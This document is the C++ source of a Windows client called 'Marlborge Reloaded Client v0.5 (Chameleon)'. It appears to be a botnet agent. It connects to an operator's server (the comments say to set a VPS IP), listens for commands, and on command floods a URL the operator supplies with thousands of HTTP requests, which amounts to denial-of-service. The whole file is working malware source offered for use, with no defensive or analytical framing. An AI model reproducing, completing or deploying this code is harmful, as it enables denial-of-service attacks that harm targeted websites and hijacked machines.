#include <iostream>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <cpr/cpr.h>
#include <sstream>

using namespace std;

#pragma comment(lib, "Ws2_32.lib")

#define HOST "127.0.0.1" // Set your VPS IP Addres
#define PORT 3000 // Set the connection port

WSADATA wsaData;

SOCKET sock;
sockaddr_in saIn;
int iResult;

char buffer[1024];

void CloseSocket() {
	closesocket(sock);
	sock = NULL;
	WSACleanup();
	iResult = NULL;
	return;
}

void DoS() {
	cout << "Sending requests to the specified URL" << endl;
	string url;
	stringstream ss;
	ss << buffer;
	ss >> url;
	cout << url;

	for (int i = 0; i < 3000; i++) {
		cpr::Get(cpr::Url{ url });
	}
	return;
}

void ConnectSocket() {
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);

	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (iResult != 0) {
		cout << "Failed at startup" << endl;
		exit(0);
	}

	if (iResult == INVALID_SOCKET) {
		cout << "Invalid socket" << endl;
		exit(0);
	}

	saIn.sin_family = AF_INET;
	inet_pton(AF_INET, HOST, &saIn.sin_addr.s_addr);
	saIn.sin_port = htons(PORT);
	iResult = connect(sock, (SOCKADDR*)&saIn, sizeof(saIn));

	if (iResult == SOCKET_ERROR) {
		cout << "Connection error" << endl;
		CloseSocket();
		ConnectSocket();
		return;
	}

	cout << "Connected" << endl;
}

void Listen() {
	cout << "Listening to the host" << endl;
	recv(sock, buffer, sizeof(buffer), 0);
	stringstream ss;
	ss << buffer; int opt; ss >> opt;
	cout << opt << endl;

	switch (opt) {
	case 1:
		DoS();
		break;
	default:
		cout << "Invalid option sent from host" << endl;
		break;
	}

	Listen();
	return;
}

int main() {
	cout << "Marlborge Reloaded Client v0.5 (Chameleon)" << endl;
	ConnectSocket();
	Listen();
	DoS();
	main();

	return 0;
}